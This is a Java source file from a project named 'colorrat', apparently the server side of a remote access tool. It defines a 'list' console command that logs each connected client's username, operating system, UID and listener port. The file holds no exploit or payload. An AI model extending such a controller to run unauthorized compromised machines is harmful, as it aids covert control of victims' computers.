package eu.aragonapp.colorrat.command.types;

import eu.aragonapp.colorrat.ColorServer;
import eu.aragonapp.colorrat.command.Command;
import eu.aragonapp.colorrat.network.NetworkConnection;

/**
 * @Copyright (c) 2018 Mythic Inc. (http://www.mythic.com/) All Rights Reserved.
 * <p>
 * Mythic Inc. licenses this file to you under the Apache License,
 * @Version 2.0 (the "License"); you may not use this file except
 * in compliance with the License.
 * You may obtain a copy of the License at
 * @https://www.apache.org/licenses/LICENSE-2.0
 */
public class ListCommand implements Command {

    @Override
    public boolean execute(String[] args) {
        ColorServer.getLogger().info("A list of all clients: ");
        for (NetworkConnection connection : ColorServer.getInstance().getClients()) {
            ColorServer.getLogger().info("- " + connection.getUsername() + ", " + connection.getOs() +  " (" + connection.getUid() +  ") » " + connection.getListener().getPort());
        }
        return true;
    }

    @Override
    public String description() {
        return "Shows a list of all connected clients with the listener port";
    }

    @Override
    public String usage() {
        return "list";
    }

    @Override
    public String name() {
        return "list";
    }

}
